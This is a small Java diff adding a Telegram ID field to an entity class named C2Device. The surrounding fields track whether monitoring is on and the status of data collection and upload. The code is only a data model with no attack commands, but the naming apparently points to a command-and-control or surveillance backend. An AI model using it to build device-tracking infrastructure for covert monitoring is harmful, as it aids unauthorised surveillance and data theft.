@@ -35,6 +35,12 @@ public class C2Device implements Serializable {
     private Integer isMonitorOn;
 
     /**
+     * Current Telegram ID (tgid)
+     */
+    @TableField("current_tg_id")
+    private String currentTgId;
+
+    /**
      * Data Collection Status (e.g., Collecting, Uploading, Done)
      */
     @TableField("data_status")
